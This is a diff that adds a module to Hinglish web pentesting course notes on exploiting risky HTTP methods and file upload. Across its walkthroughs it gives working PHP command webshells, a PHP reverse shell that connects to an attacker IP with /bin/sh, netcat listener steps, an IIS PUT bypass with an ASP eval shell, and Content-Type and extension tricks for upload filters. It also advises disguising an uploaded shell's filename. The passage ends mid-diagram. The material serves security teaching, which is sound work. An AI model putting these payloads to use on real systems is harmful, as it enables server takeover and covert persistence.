@@ -7249,3 +7249,1100 @@ On Crash:
 **Koi confusion ho to puchho. Agla module kaunsa chahiye?** 🚀
 
 ========================================================================================
+
+## Module 10: HTTP Method Exploitation & File Upload - Complete Notes
+
+Namaste beta! 👋 Swagat hai Module 10 mein. Aaj hum seekhenge kaise **HTTP methods** ka galat istemal karke server ko hack kiya jata hai aur **file upload** vulnerabilities ko kaise exploit karte hain. Yeh topic bohot important hai kyunki isse real-world bug bounty programs mein aksar paisa milta hai!
+
+---
+
+## Topic 10.1: Risky HTTP Methods (Khatarnak Methods)
+
+## 🎯 1. Title / Topic: Risky HTTP Methods - GET, POST ke alawa bhi duniya hai
+
+## 🐣 2. Samjhane ke liye (Simple Analogy)
+
+Socho tum ek school mein ho. Principal ke office ka darwaza khula hai. Andar jaake tum dekh sakte ho ki kaun-kaunsi cheezein allowed hain:
+
+- **GET** - Jaise tum principal ki table par rakhi class ki copy uthakar padh rahe ho. Sirf dekhna, kuch badalna nahi.
+- **POST** - Jaise tum principal ko ek application form de rahe ho. Naya data submit kar rahe ho.
+- **PUT** - Jaise tum principal ki diary mein apna homework likh rahe ho. Naya content add kar rahe ho ya existing ko badal rahe ho.
+- **DELETE** - Jaise tum principal ka lunchbox uthakar kachre mein fek rahe ho. Kisi cheez ko hata rahe ho.
+- **OPTIONS** - Jaise tum principal ke assistant se puch rahe ho, "Sir ke paas kaunsi cheezein karne ki permission hai?" Assistant tumhe list dega: "Padh sakte ho, likh sakte ho, delete kar sakte ho..."
+
+Ab problem yeh hai ki agar school mein koi security guard nahi hai (matlab proper permissions nahi hain), toh tum principal ki diary mein jo marzi likh sakte ho, aur kuch bhi delete kar sakte ho. Yahi hota hai jab server pe risky methods enable hote hain!
+
+## 📖 3. Technical Definition (Interview Answer)
+
+**Standard Definition:** HTTP methods (ya HTTP verbs) batate hain ki client (browser) server se kya action perform karna chahta hai. GET aur POST common hain, lekin PUT, DELETE, TRACE, OPTIONS jaise methods bhi hote hain jo agar enable hain toh security risk paida kar sakte hain.
+
+**Keywords Breakdown:**
+- **HTTP Method:** Ek tar ka command hai jo browser server ko bhejta hai, jaise "mujhe yeh page do" (GET) ya "yeh data save karo" (POST).
+- **PUT:** Server par nayi file banane ya purani file ko replace karne ka method.
+- **DELETE:** Server se file hataane ka method.
+- **OPTIONS:** Server se puchne ka method ki "tum kaunse methods support karte ho?"
+- **TRACE:** Server se request wapas bhejne ko kehna, jaise echo - debug ke liye use hota hai.
+- **HEAD:** Sirf response headers lena, body nahi - GET ki tarah but bina content ke.
+
+## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
+
+**Problem:** 
+Socho tum ek website bana rahe ho. Tum sirf users ko content dikhana chahte ho (GET) aur kuch forms submit karne dena chahte ho (POST). Lekin default configuration mein server bohot saare extra methods enable kar deta hai - PUT, DELETE, OPTIONS, TRACE etc. Ab ek hacker aata hai aur in methods ka istemal karta hai:
+- PUT se malicious file upload karta hai (shell.php)
+- DELETE se important files delete karta hai
+- TRACE se sensitive cookies steal karta hai (Cross-Site Tracing attack)
+
+**Solution:**
+Sirf unhi methods ko enable karna chahiye jo actually zaroori hain. Baaki sab disable kar dena chahiye. Jaise school mein principal ke office mein sirf authorized logo ko hi jaane do, baaki sab ko rok do.
+
+## 🔍 5. Visual - Jab Screen Par Kya Dikhega
+
+**Location:** Burp Suite mein **Repeater** tab mein tum yeh sab karte ho.
+
+**Appearance:**
+Jab tum koi request Repeater mein bhejte ho, toh upar ek line hoti hai:
+```
+GET / HTTP/1.1
+```
+Yahan `GET` ki jagah tum koi bhi method likh sakte ho - `PUT`, `DELETE`, `OPTIONS`, etc.
+
+**Expected Screen:**
+```
+Request tab:
+PUT /uploads/shell.php HTTP/1.1
+Host: example.com
+Content-Length: 25
+
+<?php phpinfo(); ?>
+```
+
+Response tab:
+```
+HTTP/1.1 201 Created
+Server: Apache/2.4.41
+...
+```
+
+## ⚙️ 6. Under the Hood (Technical Working)
+
+**Step-by-step logical flow:**
+
+**OPTIONS Method ka flow:**
+```
+Step 1: Browser/Attacker server ko puchta hai: "Tum kaunse methods support karte ho?"
+        Request: OPTIONS / HTTP/1.1
+
+Step 2: Server apni configuration check karta hai: 
+        "Mere paas yeh methods enable hain: GET, POST, PUT, DELETE, OPTIONS"
+
+Step 3: Server response bhejta hai:
+        Response: HTTP/1.1 200 OK
+        Header: Allow: GET, POST, PUT, DELETE, OPTIONS
+```
+
+**PUT Method ka flow:**
+```
+Step 1: Attacker file upload karne ki koshish karta hai:
+        Request: PUT /test/shell.php HTTP/1.1
+        Body: <?php system($_GET['cmd']); ?>
+
+Step 2: Server check karta hai:
+        - Kya PUT method enable hai? → Haan
+        - Kya /test/ folder mein write permission hai? → Haan (777)
+        - Kya shell.php already exist karti hai? → Nahi, nayi banani hai
+
+Step 3: Server file create karta hai aur response bhejta hai:
+        Response: HTTP/1.1 201 Created (nayi file banayi)
+        Ya: HTTP/1.1 204 No Content (file update ki, koi content nahi bhej raha)
+```
+
+## 💻 7. Hands-On: Step-by-Step Practical
+
+**Step 1: Target website ki request intercept karo**
+
+```text
+Browser mein target website kholo (jaise http://example.com)
+Burp Suite mein Proxy → Intercept tab par jao
+Intercept ON karo (button blue hona chahiye)
+Browser mein kuch bhi click karo, request intercept ho jayegi
+```
+
+**Step 2: Request ko Repeater mein bhejo**
+
+```text
+Intercept hui request par RIGHT-CLICK karo
+Menu khulega → "Send to Repeater" par CLICK karo
+```
+
+**Step 3: Repeater tab mein jao aur method change karo**
+
+```text
+Burp mein upar "Repeater" tab par click karo
+Request mein sabse upar line dikhegi: GET / HTTP/1.1
+"GET" ko delete karke "OPTIONS" likho
+"Send" button click karo (upar left side)
+```
+
+**Expected Response:**
+```text
+Right side response box mein kuch aisa dikhega:
+
+HTTP/1.1 200 OK
+Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
+Content-Length: 0
+
+(Yahan Allow header mein saare enabled methods list hain)
+```
+
+**Step 4: Agar PUT dikh raha hai toh exploitation try karo**
+
+```text
+Ab request mein method ko "PUT" mein change karo
+URL mein file ka naam do: PUT /test/shell.php HTTP/1.1
+(Note: /test/ folder exist karna chahiye)
+
+Neeche body mein PHP code daalo:
+<?php echo "Hacked!"; ?>
+
+Content-Length sahi karo (jitne characters hain utna)
+Send button click karo
+```
+
+**Expected Response (Success):**
+```text
+HTTP/1.1 201 Created
+Ya
+HTTP/1.1 204 No Content
+```
+
+**Step 5: File ko browser mein check karo**
+
+```text
+Browser kholo aur jao:
+http://example.com/test/shell.php
+
+Screen par "Hacked!" dikhna chahiye
+Matlab file upload successful!
+```
+
+## ⚖️ 8. Comparison (Ye vs Woh)
+
+| Feature | GET | POST | PUT | DELETE |
+|---------|-----|------|-----|--------|
+| **Kaam kya hai?** | Data maangna | Data submit karna | File upload karna | File delete karna |
+| **Safe ya risky?** | Generally safe | Thoda risky | Bohot risky | Bohot risky |
+| **Idempotent?** | Haan (same request multiple baar = same result) | Nahi (har baar naya data create ho sakta) | Haan | Haan |
+| **Kyun enable rakhein?** | Websites ke liye zaroori | Forms ke liye zaroori | Sirf agar file upload feature ho | Sirf agar file delete feature ho |
+
+## 🚫 9. Common Mistakes (Beginner Traps)
+
+- **Mistake 1:** Sirf GET/POST check karke sochna ki server safe hai
+  - **Fix:** Hamesha OPTIONS request bhejke saare enabled methods check karo
+
+- **Mistake 2:** PUT request mein body dena bhool jana
+  - **Fix:** PUT mein body dena zaroori hai - jo content doge wahi file mein save hoga
+
+- **Mistake 3:** Galat URL dena (jaise `/shell.php` instead of `/uploads/shell.php`)
+  - **Fix:** Pehle pata karo ki kaunsa folder writable hai. Try `/test/`, `/uploads/`, `/images/` etc.
+
+- **Mistake 4:** Content-Length galat set karna
+  - **Fix:** Burp automatically calculate karta hai, lekin agar manually change kar rahe ho toh characters count karo
+
+## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
+
+**Confusion 1: "Log sochte hain ki OPTIONS method sirf ek 'extra' method hai jiska koi use nahi"**
+
+Actually, OPTIONS bohot important hai hackers ke liye! Yeh server ka "menu card" hai. Jaise restaurant mein menu card dekhkar pata lagta hai ki kaunsi dishes available hain, waise hi OPTIONS se pata lagta hai ki kaunse methods available hain. Agar menu mein "PUT" dikha, toh hacker feast karne aa jayega!
+
+**Confusion 2: "PUT method enable hai toh turant hack ho sakta hai?"**
+
+Nahi beta, itna easy nahi hai. PUT method enable hona chahiye **AUR** jis folder mein file upload kar rahe ho uski permissions bhi honi chahiye writable. Jaise school mein principal ka office khula hai but andar jaake kuch bhi karne ke liye permission chahiye. Agar folder ki permission 777 hai (matlab koi bhi kuch bhi likh sakta hai), tabhi hack possible hai.
+
+## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting)
+
+**Scenario:** Ek baar ek bug bounty hunter ne **Yahoo!** ki subdomain par testing ki. Usne OPTIONS request bheji aur dekha ki **PUT method enabled** tha. Usne `/uploads/` folder mein `test.txt` upload karne ki koshish ki aur wo successful ho gaya! Matlab wo koi bhi malicious file upload kar sakta tha.
+
+**How they used it:** 
+1. Pehle OPTIONS se pata kiya ki PUT enabled hai
+2. PUT request bheji: `PUT /uploads/shell.php HTTP/1.1`
+3. Body mein PHP reverse shell daala
+4. Browser se file access kiya aur server ka control le liya
+
+**Result:** Yahoo! ne turant issue fix kiya aur hunter ko **$2000** ka bounty diya! 💰
+
+## 🎨 12. Visual Diagram (ASCII Art)
+
+```
+[Attacker Browser] 
+       |
+       | 1. OPTIONS / HTTP/1.1
+       | 2. Server replies: Allow: GET,POST,PUT,DELETE
+       V
+[Target Server]
+       |
+       | 3. Attacker sends PUT /shell.php
+       | 4. Server creates file (if permissions allow)
+       V
+[Server File System]
+       |
+       | 5. shell.php saved in /uploads/
+       |
+       V
+[Attacker accesses shell.php in browser]
+       |
+       | 6. Browser sends GET /uploads/shell.php
+       | 7. PHP code executes
+       V
+[Server Compromised!]
+```
+
+## 🛠️ 13. Best Practices (Pro Tips)
+
+- **Tip 1:** Hamesha **OPTIONS** request se start karo. Ye tumhara侦察 (recon) tool hai.
+- **Tip 2:** PUT try karne se pehle check karo ki kaunse folders writable hain. Common folders: `/uploads/`, `/images/`, `/files/`, `/temp/`, `/test/`
+- **Tip 3:** Agar `201 Created` ya `204 No Content` nahi aa raha, toh `403 Forbidden` ya `405 Method Not Allowed` aayega. Dono responses dekh kar pata chalega ki method disable hai ya permissions issue hai.
+- **Tip 4:** Real pentesting mein pehle client se permission lo! Bina permission ke kisi server par PUT request bhejna illegal hai.
+
+## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?)
+
+**Scenario 1: Server par PUT enabled hai but tumne check nahi kiya**
+- Koi hacker aayega, shell.php upload karega, aur tumhara pura server hack kar lega. Saara data leak ho jayega.
+
+**Scenario 2: Tumne galat folder mein PUT try kiya**
+- Server `403 Forbidden` dega aur tumhe lagega ki PUT working nahi hai. Actually ho sakta hai PUT enable ho but uss folder ki permissions na hon. Dusra folder try karna chahiye tha.
+
+**Scenario 3: DELETE method enabled hai but tumne accidentally galat file delete kar di**
+- Production server ki important files delete ho sakti hain, website down ho jayegi. Isliye testing environment mein pehle practice karo!
+
+## ❓ 15. FAQ (Interview Questions)
+
+**Q1: HTTP OPTIONS method kya karta hai?**
+**A1:** OPTIONS method server se puchta hai ki "tum kaunse HTTP methods support karte ho?" Server response mein `Allow` header ke through list bhejta hai, jaise `Allow: GET, POST, PUT, DELETE, OPTIONS`.
+
+**Q2: PUT method kaise exploit karte hain?**
+**A2:** Pehle OPTIONS se confirm karo ki PUT enabled hai. Phir ek PUT request bhejo jisme file ka naam do aur body mein malicious code daalo. Agar server `201 Created` ya `204 No Content` return kare, toh file upload successful hai. Phir browser se us file ko access karo.
+
+**Q3: Idempotent method ka kya matlab hai?**
+**A3:** Idempotent matlab agar tum ek request multiple baar bhejo, toh har baar same result aaye. Jaise PUT - chahe ek baar bhejo ya 10 baar, file ek hi baar create/update hogi. POST idempotent nahi hai - har baar naya record ban sakta hai.
+
+**Q4: DELETE method ka risk kya hai?**
+**A4:** DELETE method enable hai toh hacker server ki important files delete kar sakta hai, jisse website down ho sakti hai, data loss ho sakta hai, aur service unavailable ho sakti hai.
+
+**Q5: Server par PUT enable hai but file upload nahi ho raha - kya problem ho sakti?**
+**A5:** Do possibilities hain:
+1. Folder ki write permission nahi hai (folder 777 nahi hai)
+2. File extension restriction hai (jaise sirf .jpg allow hai)
+3. Web server ki configuration mein PUT disable hai specific folders ke liye
+
+## 📝 16. Ek Line Mein Yaad Rakhne Ko
+
+**"OPTIONS server ka menu card hai, PUT hacker ka free file upload ticket hai!"**
+
+---
+
+## Topic 10.2: HTTP Method Exploitation - Practical Steps
+
+## 🎯 1. Title / Topic: HTTP Method Exploitation - Jab server tumhe hack hone ke liye bulaye
+
+## 🐣 2. Samjhane ke liye (Simple Analogy)
+
+Socho tum ek building mein ghusna chahte ho. Pehle tum guard se puchte ho, "Sir, andar jaane ke kitne raaste hain?" (OPTIONS). Guard batata hai, "Teen raaste hain - main gate, service entrance, aur window." Ab tum service entrance (PUT) se andar ghusne ki koshish karte ho. Andar jaake tum apna saman rakh dete ho (file upload). Phir jab wapas aate ho, tum apne saman ka istemal karte ho building ka control lene ke liye (access the shell).
+
+Yahi hai HTTP method exploitation - pehle pata karo ki kitne raaste hain, phir sabse kamzor raaste se andar ghuso!
+
+## 📖 3. Technical Definition (Interview Answer)
+
+**Standard Definition:** HTTP method exploitation ek technique hai jisme attacker pehle server ke enabled methods ka pata lagata hai (OPTIONS), phir risky methods (PUT/DELETE) ka istemal karke unauthorized actions perform karta hai jaise malicious file upload ya file deletion.
+
+**Keywords Breakdown:**
+- **Exploitation:** Kisi vulnerability ka fayda uthakar system se unauthorized access lena
+- **Repeater:** Burp Suite ka tool jo ek request ko baar-baar modify karke bhejne deta hai
+- **Reverse Shell:** Ek script jo victim server se attacker ke computer par connection wapas banati hai
+- **C99shell:** Ek famous PHP shell jo server ka GUI access deta hai (jaise Windows Explorer but for server)
+
+## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
+
+**Problem:**
+Tum ek website ko test kar rahe ho. Tumhe lagta hai ki sirf GET aur POST methods hain. Lekin server ne PUT aur DELETE bhi enable kar rakhe hain. Agar tumne yeh check nahi kiya, toh tum vulnerability miss kar doge. Hacker isi gap ko use karke server hack kar lega.
+
+**Solution:**
+Systematic approach se:
+1. Pehle OPTIONS se sab enabled methods ka pata lagao
+2. Phir PUT se file upload karo
+3. Uploaded file ko execute karo
+4. Server ka control le lo
+
+## 🔍 5. Visual - Jab Screen Par Kya Dikhega
+
+**Step 1: Request Intercept karo**
+
+```
+Burp Suite - Proxy - Intercept tab
+-------------------------------------------------
+GET / HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+...
+```
+
+**Step 2: Repeater mein bhejo**
+
+```
+Burp Suite - Repeater tab
+-------------------------------------------------
+Request:                         Response:
+GET / HTTP/1.1                   HTTP/1.1 200 OK
+Host: example.com                 ...
+...                              ...
+```
+
+**Step 3: Method OPTIONS karo**
+
+```
+Request modified:                 Response:
+OPTIONS / HTTP/1.1                HTTP/1.1 200 OK
+Host: example.com                 Allow: GET,HEAD,POST,PUT,DELETE,OPTIONS
+...                               ...
+```
+
+**Step 4: PUT request bhejo**
+
+```
+Request:                          Response:
+PUT /uploads/shell.php HTTP/1.1   HTTP/1.1 201 Created
+Host: example.com                  Location: /uploads/shell.php
+Content-Length: 45                 ...
+
+<?php system($_GET['cmd']); ?>
+```
+
+## ⚙️ 6. Under the Hood (Technical Working)
+
+**Reverse Shell kaise kaam karta hai:**
+
+```
+[Attacker Machine]                              [Victim Server]
+    |                                                    |
+    | 1. Attacker netcat listener start karta hai       |
+    |    nc -lvnp 4444                                   |
+    |                                                    |
+    | 2. Attacker PUT request bhejta hai                 |
+    |    --------shell.php with reverse shell code------>|
+    |                                                    |
+    | 3. Server shell.php save karta hai                 |
+    |    (agar permissions hain)                         |
+    |                                                    |
+    | 4. Attacker browser se shell.php request karta hai |
+    |    GET /uploads/shell.php?cmd=nc... -------------->|
+    |                                                    |
+    | 5. Server PHP execute karta hai                    |
+    |    Reverse shell code run hota hai                 |
+    |    ---Connection back on port 4444---------------->|
+    |                                                    |
+    | 6. Attacker ko server ka shell mil jata hai        |
+    |    (jaise server par baitha ho waise commands)     |
+```
+
+## 💻 7. Hands-On: Step-by-Step Practical
+
+**Step 1: Pehle target ki request intercept karo**
+
+```text
+Browser mein target site kholo (http://testphp.vulnweb.com/)
+Burp Suite mein Proxy → Intercept → Intercept is on
+Site par kisi bhi link par click karo
+Request intercept ho jayegi
+```
+
+**Step 2: Request ko Repeater mein bhejo**
+
+```text
+Intercept hui request par RIGHT-CLICK karo
+"Send to Repeater" select karo
+```
+
+**Step 3: OPTIONS request bhejke enabled methods check karo**
+
+```text
+Repeater tab mein jao
+Request line mein "GET" ko delete karke "OPTIONS" likho
+"Send" button click karo
+
+Response dekho - Allow header mein kya likha hai?
+Agar "PUT" dikha, toh game on! 🎯
+```
+
+**Step 4: PUT request prepare karo**
+
+```text
+Ab request line mein "OPTIONS" ko "PUT" mein badlo
+URL mein file ka naam do: PUT /uploads/shell.php HTTP/1.1
+(Note: /uploads/ folder exist karta hai ya nahi pehle pata karo)
+
+Headers check karo:
+- Host: target.com (yahi rahega)
+- Content-Type: application/x-www-form-urlencoded (ya rahne do)
+- Content-Length: (Burp automatically set kar dega)
+
+Neeche ek blank line ke baad body mein yeh code daalo:
+```
+
+```php
+<?php
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
+?>
+```
+
+**Step 5: PHP code ka breakdown**
+
+```php
+<?php 
+// PHP start - yeh batata hai ki ab PHP code shuru ho raha hai
+
+if(isset($_GET['cmd'])){
+// isset check karta hai ki URL mein 'cmd' variable aaya ya nahi
+// $_GET matlab URL se value lena, jaise: shell.php?cmd=whoami
+// Agar 'cmd' aaya hai toh condition true hogi
+
+    system($_GET['cmd']);
+    // system() function jo bhi command 'cmd' mein aayi hai use execute karta hai
+    // Jaise 'whoami' aaya toh server par 'whoami' command chalegi
+    // Output browser mein dikhega
+}
+?>
+// PHP end
+```
+
+**Step 6: Request send karo**
+
+```text
+"Send" button click karo
+Response check karo - 201 Created ya 204 No Content aana chahiye
+```
+
+**Step 7: Uploaded file ko test karo**
+
+```text
+Browser mein jao: 
+http://testphp.vulnweb.com/uploads/shell.php?cmd=whoami
+
+Response mein server ka username dikhna chahiye (jaise www-data)
+Matlab file upload successful aur execute bhi ho rahi hai!
+```
+
+**Step 8: Reverse shell daalo (Advanced)**
+
+```text
+Ab shell.php ko update karo better payload se:
+
+PUT /uploads/shell.php HTTP/1.1
+...
+
+<?php
+$sock=fsockopen("YOUR_IP",4444);
+// YOUR_IP ki jagah apna IP daalo (tumhara attacker machine ka IP)
+// fsockopen ek network connection banata hai tumhare IP aur port 4444 par
+
+$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+// proc_open ek shell process start karta hai (/bin/sh)
+// array(0=>$sock, 1=>$sock, 2=>$sock) matlab shell ka input, output, error sab network socket par bhejo
+// Isse jo tum shell mein type karoge, wo server par execute hoga
+?>
+```
+
+**Step 9: Attacker machine par listener start karo**
+
+```text
+Apne terminal mein (Linux/Mac) yeh command chalao:
+
+$ nc -lvnp 4444
+
+Breakdown:
+nc      : netcat command - network connections ke liye tool
+-l      : listen mode (sunne lagao)
+-v      : verbose (details dikhao)
+-n      : no DNS (IP par directly connect karo)
+-p 4444 : port 4444 par listen karo
+
+Expected Output:
+listening on [any] 4444 ...
+```
+
+**Step 10: Reverse shell trigger karo**
+
+```text
+Browser mein jao:
+http://testphp.vulnweb.com/uploads/shell.php
+
+Ab apne terminal mein dekho - connection aana chahiye:
+
+connect to [YOUR_IP] from victim.com [VICTIM_IP] 12345
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+$ dikh raha hai? Ab tum server par commands chala sakte ho!
+Try: whoami, ls -la, pwd etc.
+```
+
+## ⚖️ 8. Comparison (Ye vs Woh)
+
+| Feature | Simple PHP Shell | Reverse Shell | C99 Shell |
+|---------|------------------|---------------|-----------|
+| **Kaam kya hai?** | Commands run karo | Server se wapas connection | GUI interface |
+| **Connection type** | Browser se request | Server se attacker ko | Browser se request |
+| **Advantage** | Simple, easy to use | Firewall bypass | File manager, DB access |
+| **Disadvantage** | Har command ke liye URL hit | Attacker ka IP open rakhna | Often detected by AV |
+| **Size** | 2-3 lines | 5-10 lines | 1000+ lines |
+
+## 🚫 9. Common Mistakes (Beginner Traps)
+
+- **Mistake 1:** PUT request mein body mein code daalna bhool jana
+  - **Fix:** Body mein hamesha code do, warna empty file banegi
+
+- **Mistake 2:** Reverse shell mein apna IP galat dalna
+  - **Fix:** `ifconfig` (Linux) ya `ipconfig` (Windows) se apna IP check karo. Public IP? Private IP? Cloud server hai toh public IP do.
+
+- **Mistake 3:** Port number dono jagah match na karna
+  - **Fix:** Netcat listener mein jo port do (4444), wahi reverse shell mein do
+
+- **Mistake 4:** Firewall block kar raha hai
+  - **Fix:** Common ports try karo: 80, 443, 53, 8080. Ya fir bind shell try karo (server port open kare, tum connect karo)
+
+## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
+
+**Confusion 1: "Reverse shell aur bind shell mein kya antar hai?"**
+
+Reverse shell: Server tumse connection banata hai. Jaise server ke andar se tumhe phone kare.
+Bind shell: Server ek port open karta hai, tum uss port par connection banate ho. Jaise server phone uthake rakhe, tum call karo.
+
+Kab kaunsa use karein? Agar server firewall ke peeche hai aur incoming connections block hain, toh reverse shell use karo (outgoing usually allowed hai). Agar tumhare paas public IP nahi hai, toh bind shell use karo.
+
+**Confusion 2: "C99shell kya hota hai?"**
+
+C99shell ek famous PHP shell script hai jisme bohot saare features hote hain - file manager, database manager, command executor, port scanner, etc. Jaise Windows Explorer mein files dekh sakte ho, waise hi C99shell se server ki files dekh sakte ho, edit kar sakte ho, delete kar sakte ho. Lekin yeh bohot famous hai isliye antivirus aur IDS/IPS easily detect kar lete hain.
+
+## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting)
+
+**Scenario:** Ek pentester ne ek large e-commerce site ka test kiya. Usne OPTIONS request bheji aur dekha ki **PUT method enabled** tha. Lekin jab usne PUT request bheji toh `403 Forbidden` mila.
+
+**How they used it:**
+Usne notice kiya ki server `Microsoft IIS` chal raha tha. IIS mein ek vulnerability hai ki agar tum PUT request mein `%20` (space) add karo, toh restrictions bypass ho sakti hai. Usne yeh request bheji:
+
+```
+PUT /uploads/shell.asp%20 HTTP/1.1
+...
+<% eval request("cmd") %>
+```
+
+Server ne file create kar di `shell.asp` (space automatically remove ho gaya). Ab wo ASP shell upload kar paya!
+
+**Result:** Server ka control mila, critical vulnerability reported, aur client ne turant fix karwaya. Pentester ko **$5000** ka contract mila!
+
+## 🎨 12. Visual Diagram (ASCII Art)
+
+```
+[Phase 1: Recon]
+[Attacker] --OPTIONS--> [Server]
+[Server] --Allow: PUT--> [Attacker]
+
+[Phase 2: Upload]
+[Attacker] --PUT /shell.php--> [Server]
+[Server] --201 Created--> [Attacker]
+[Server] [shell.php saved]
+
+[Phase 3: Setup Listener]
+[Attacker Machine]
+$ nc -lvnp 4444
+[Waiting for connection...]
+
+[Phase 4: Trigger]
+[Attacker] --GET /shell.php--> [Server]
+[Server] --executes PHP--> 
+[Server] --reverse connection--> [Attacker:4444]
+
+[Phase 5: Shell]
+[Attacker] <--connected--> [Server Shell]
+$ whoami
+www-data
+$ ls
+[Attacker can now run commands on server]
+```
+
+## 🛠️ 13. Best Practices (Pro Tips)
+
+- **Tip 1:** Pehle hamesha **OPTIONS** request bhejo. Kuch servers `Allow` header nahi dete, lekin `Public` header de sakte hain. Dono check karo.
+- **Tip 2:** PUT request mein file extension ka dhyan rakh. Agar server PHP execute karta hai toh `.php` do. Agar ASP hai toh `.asp`, `.aspx`. Agar JSP hai toh `.jsp`.
+- **Tip 3:** Agar `403 Forbidden` aa raha hai, toh folder change karo. `/uploads/`, `/images/`, `/files/`, `/temp/`, `/test/` - sab try karo.
+- **Tip 4:** Reverse shell mein sometimes `python -c 'import pty;pty.spawn("/bin/bash")'` use karo better shell ke liye.
+- **Tip 5:** Shell upload karne ke baad usko hide karne ki koshish karo. File ka naam aisa rakho jo suspicious na lage - `image.php`, `profile_pic.php`, `README.php`
+
+## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?)
+
+**Scenario 1: Bina permission ke PUT request bhej di**
+- Tum par legal case ho sakta hai. Hamesha authorized testing mein hi karo.
+
+**Scenario 2: Reverse shell mein apna public IP daalna bhool gaye**
+- Connection nahi aayega. Agar local network mein test kar rahe ho toh private IP do, agar VPS se kar rahe ho toh public IP do.
+
+**Scenario 3: Firewall ne block kar diya**
+- Tumhara listener chal raha hai but connection nahi aa raha. Different ports try karo ya bind shell use karo.
+
+**Scenario 4: PHP code mein syntax error**
+- File upload to ho gayi but execute nahi ho rahi. Response mein PHP error aayega. Pehle simple `<?php phpinfo(); ?>` try karo.
+
+## ❓ 15. FAQ (Interview Questions)
+
+**Q1: OPTIONS request ka response kaise decode karein?**
+**A1:** Response mein `Allow` header dekho. Jaise `Allow: GET, POST, PUT, DELETE, OPTIONS`. Kabhi `Public` header bhi ho sakta hai. Agar dono nahi hai toh server ne methods hide kiye hain - HEAD request try karo ya TRACE.
+
+**Q2: PUT request mein `201 Created` aur `204 No Content` mein kya antar hai?**
+**A2:** `201 Created` matlab server ne nayi file banayi. `204 No Content` matlab file already thi aur update kar di (ya banayi) but response mein koi content nahi bhej raha. Dono successful upload indicate karte hain.
+
+**Q3: Reverse shell kaise kaam karta hai?**
+**A3:** Reverse shell mein victim server ek connection banata hai attacker ki machine par. Attacker pehle apni machine par listener lagata hai (netcat). Phir victim par ek script (PHP, Python, etc.) run hoti hai jo uss listener se connect karti hai. Connection establish hone ke baad attacker victim server par commands run kar sakta hai.
+
+**Q4: PUT method disable hai toh kya alternatives hain?**
+**A4:** Agar PUT disable hai, toh doosre methods check karo:
+- **POST** with file upload functionality (agar form hai)
+- **WebDAV** methods (PROPFIND, MKCOL, MOVE, COPY)
+- **CONNECT** method (proxy exploitation)
+
+**Q5: File upload ke baad bhi shell execute nahi ho raha - kya karein?**
+**A5:** Possible reasons:
+1. Server PHP execute nahi karta uss folder mein (check by uploading `test.txt` and accessing it)
+2. File extension blacklisted (try `.php5`, `.phtml`, `.php7`, `.phar`)
+3. Content check ho raha hai (bypass using GIF89a header ya image polyglot)
+
+## 📝 16. Ek Line Mein Yaad Rakhne Ko
+
+**"OPTIONS se menu dekho, PUT se khana rakho, reverse shell se server par haq jamao!"**
+
+---
+
+## Topic 10.3: File Upload & Max Length Limit Bypass
+
+## 🎯 1. Title / Topic: File Upload Bypass - Jab server sirf label dekhta hai, andar nahi
+
+## 🐣 2. Samjhane ke liye (Simple Analogy)
+
+Socho tum ek post office ho. Tum parcel bhejna chahte ho. Guard tumse kehta hai, "Sirf 'Books' label wale parcels andar ja sakte hain." Tum ek book lete ho, uspar label lagate ho "Books", lekin andar tumne chupke se ek camera rakh diya. Guard ne sirf label dekha, andar nahi jhankha - parcel andar chala gaya.
+
+Yahi hota hai file upload bypass mein. Server sirf `Content-Type` header check karta hai (label), actual file content nahi. Tum ek malicious PHP file lete ho, uske saath `Content-Type: image/jpeg` ka label laga dete ho, server sochega ki yeh image hai aur upload kar lega!
+
+## 📖 3. Technical Definition (Interview Answer)
+
+**Standard Definition:** File upload bypass ek technique hai jisme attacker server-side validation controls ko circumvent karta hai by modifying request parameters jaise `Content-Type`, file extension, ya file size, taaki malicious file upload ho sake jo normally restricted hoti.
+
+**Keywords Breakdown:**
+- **Content-Type:** HTTP header jo batata hai ki request mein kis type ka data bheja ja raha hai (image/jpeg, text/plain, application/x-php)
+- **MIME Type:** Content-Type ka dusra naam - Multipurpose Internet Mail Extensions
+- **Max Length Limit:** Server kitni badi file allow karta hai (usually bytes mein)
+- **Client-side validation:** Browser mein JavaScript se check karna (easily bypass)
+- **Server-side validation:** Server par check karna (difficult to bypass)
+
+## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
+
+**Problem:**
+Bohot saari websites file upload feature deti hain - profile picture, resume, attachments. Ye websites sirf images ya PDF allow karna chahti hain. Isliye wo check karti hain:
+- File extension (.jpg, .png hona chahiye)
+- Content-Type (image/jpeg hona chahiye)
+- File size (2MB se kam hona chahiye)
+
+Lekin ye checks sahi se implement nahi hote. Hacker inhe bypass karke PHP shell upload kar sakta hai.
+
+**Solution:**
+Request ko intercept karke:
+1. Extension change karo (.jpg ke andar PHP chhupa do)
+2. Content-Type modify karo (image/jpeg bana do)
+3. Size bypass karo (agar multiple requests mein tod do)
+
+## 🔍 5. Visual - Jab Screen Par Kya Dikhega
+
+**Normal file upload form:**
+```
+Website par ek form hai:
+-------------------------------------------------
+Choose file: [Browse...] (test.php)
+[Upload Button]
+-------------------------------------------------
+```
+
+**Burp intercept karega request:**
+```
+POST /upload.php HTTP/1.1
+Host: example.com
+Content-Type: multipart/form-data; boundary=----12345
+Content-Length: 345
+
+------12345
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']); ?>
+------12345--
+```
+
+**Modified request (bypass attempt):**
+```
+POST /upload.php HTTP/1.1
+Host: example.com
+Content-Type: multipart/form-data; boundary=----12345
+Content-Length: 345
+
+------12345
+Content-Disposition: form-data; name="file"; filename="test.jpg"
+Content-Type: image/jpeg
+
+<?php system($_GET['cmd']); ?>
+------12345--
+```
+
+## ⚙️ 6. Under the Hood (Technical Working)
+
+**File upload validation types:**
+
+```
+[Client Browser]
+       |
